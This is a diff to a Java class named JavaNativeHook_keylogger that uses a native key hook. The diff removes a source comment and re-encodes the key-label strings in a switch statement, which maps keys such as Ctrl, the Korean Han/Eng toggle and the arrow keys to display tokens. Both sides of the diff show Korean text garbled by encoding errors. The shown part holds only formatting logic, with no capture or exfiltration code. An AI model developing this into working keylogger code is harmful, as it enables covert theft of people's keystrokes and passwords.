@@ -1,4 +1,3 @@
-//ÂüÁ¶ : https://m.blog.naver.com/whdals7979/221289900674
 
 import java.util.logging.Level;
 import java.util.logging.LogManager;
@@ -20,7 +19,7 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 			st = st.replace("ctrl","[CTRL]");
 			break;
 		case "meta":
-			st = st.replace("meta","[À©µµ¿ìÅ°]");
+			st = st.replace("meta","[ìœˆë„ìš°í‚¤]");
 			break;
 		case "alt":
 			st = st.replace("alt","[ALT]");
@@ -40,8 +39,8 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 		case "enter":
 			st = st.replace("enter","[ENTER]");
 			break;
-		case "°¡Å¸Ä«³ª":
-			st = st.replace("°¡Å¸Ä«³ª","[ÇÑ/¿µ]");
+		case "ê°€íƒ€ì¹´ë‚˜":
+			st = st.replace("ê°€íƒ€ì¹´ë‚˜","[í•œ/ì˜]");
 			break;
 		case "caps lock":
 			st = st.replace("caps lock","[CAPS LOCK]");
@@ -52,8 +51,8 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 		case "minus":
 			st = st.replace("minus","-");
 			break;
-		case "°£Áö":
-			st = st.replace("°£Áö","[ÇÑÀÚ]");
+		case "ê°„ì§€":
+			st = st.replace("ê°„ì§€","[í•œì]");
 			break;
 		case "period":
 			st = st.replace("period",".");
@@ -65,16 +64,16 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 			st = st.replace("quote","`");
 			break;
 		case "right":
-			st = st.replace("right","¡æ");
+			st = st.replace("right","â†’");
 			break;
 		case "left":
-			st = st.replace("left","¡ç");
+			st = st.replace("left","â†");
 			break;
 		case "up":
-			st = st.replace("up","¡è");
+			st = st.replace("up","â†‘");
 			break;
 		case "down":
-			st = st.replace("down","¡é");
+			st = st.replace("down","â†“");
 			break;
 		}
 
